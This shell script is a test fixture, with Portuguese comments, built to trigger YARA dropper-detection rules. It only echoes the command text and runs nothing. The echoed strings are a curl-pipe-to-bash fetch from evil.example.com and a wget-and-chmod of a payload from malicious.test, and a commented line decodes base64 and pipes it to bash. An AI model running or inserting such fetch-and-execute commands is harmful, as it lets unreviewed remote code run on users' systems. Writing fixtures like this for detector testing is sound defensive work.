#!/bin/sh
# DROPPER DE TESTE — INOFENSIVO. So texto que parece codigo malicioso pra
# os detectores YARA (DropperBashCurlPipe, DropperBase64Eval) se exercitarem.
# NAO executa nada.

# Padrao classico curl|sh — atacante baixa script + executa sem revisar
echo "Pretending to drop:"
echo "  curl https://evil.example.com/x.sh | bash"
echo "  wget -O /tmp/payload http://malicious.test && chmod +x /tmp/payload"

# Padrao base64 + eval — comum em malware obfuscado
# echo 'aWQ=' | base64 -d | bash    (decodifica 'id' e roda)

exit 0
